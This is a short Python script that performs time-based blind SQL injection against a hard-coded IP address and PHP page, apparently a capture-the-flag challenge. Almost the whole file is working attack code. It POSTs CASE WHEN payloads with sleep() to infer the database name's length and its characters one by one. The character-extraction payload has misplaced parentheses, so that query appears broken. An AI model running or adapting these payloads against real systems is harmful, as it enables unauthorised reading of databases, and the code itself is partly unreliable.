import requests


meta_data = 'abcdefghijklmnopqrstuvwxyz_}!:@#$&[]'
key_name = "0123456789*/\{?}!:@#$&[]."
url = "http://123.206.87.240:8002/chengjidan/index.php"


def calc_database_length():
    for index in range(0,50):
        playloads = "0'or/**/case/**/when(length(database())={0})then(sleep(5))else(select 2)end/**/or'2'='1".format(index)
        try:
            requests.post(url, data={'id': playloads}, timeout=3)
        except Exception:
            print(index)
            exit(1)



def calc_name():
    for i in range(1,11):
        for index in meta_data:
            playloads = "0'or/**/case/**/when(select(substring(database()),{0},1))='{1}')then(sleep(10))else(select 2)end/**/or'2'='1".format(i, index)
            print(playloads)
            try:
                requests.post(url, data={"id": playloads}, timeout=7)
            except Exception:
                print(index)
if __name__ == "__main__":
    # calc_database_length()
    calc_name()
        
        
